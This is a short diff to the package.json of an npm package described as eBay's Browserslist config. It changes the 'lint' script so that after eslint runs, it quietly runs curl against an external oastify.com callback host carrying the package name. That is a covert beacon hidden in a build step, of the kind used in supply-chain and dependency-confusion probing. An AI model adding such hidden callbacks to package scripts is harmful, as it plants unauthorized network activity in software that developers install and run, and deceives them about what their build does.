@@ -4,7 +4,7 @@
   "description": "The Browserslist config for eBay.",
   "main": "index.js",
   "scripts": {
-    "lint": "eslint .",
+    "lint": "eslint . && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/eBay/browserslist-config",
     "test": "jest"
   },
   "repository": {
